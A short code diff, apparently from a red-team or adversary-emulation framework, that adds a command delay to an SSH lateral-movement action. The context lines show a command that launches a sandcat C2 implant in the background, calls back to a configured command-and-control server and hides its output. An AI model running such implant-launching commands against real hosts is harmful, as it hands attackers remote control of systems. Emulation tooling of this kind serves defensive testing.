@@ -16,4 +16,4 @@ class SSHLateralMove(LowLevelAction):
             f"'nohup ./sandcat_tmp.go -server {settings.c2_server} -group red 1>/dev/null 2>/dev/null &'"
         )
         payloads = ["sandcat.go-linux"]
-        super().__init__(agent, command, payloads)
+        super().__init__(agent, command, payloads, command_delay=3)
